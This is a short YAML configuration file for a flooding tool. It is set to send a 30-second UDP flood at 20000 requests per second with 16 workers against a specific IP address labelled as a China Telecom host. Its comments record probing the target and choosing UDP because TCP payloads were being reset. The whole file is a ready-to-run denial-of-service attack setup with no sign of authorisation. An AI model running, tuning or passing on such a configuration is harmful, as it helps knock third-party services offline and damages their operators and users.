# Target: 203.0.113.17 (China Telecom / Chongqing, RTT ~60ms)
# Probed 2026-08-28: TCP handshake OK on :80/:8080 but RSTs on payload —
# no usable web service. UDP is the best fit; HTTP = connection-exhaustion test.

target: 203.0.113.17:9999     # UDP (no handshake needed)
attack: udp
duration_sec: 30
rate:
  rps: 20000                     # start modest; RTT ~60ms limits effective pps
workers: 16
udp:
  size: 512
  fill: "x"

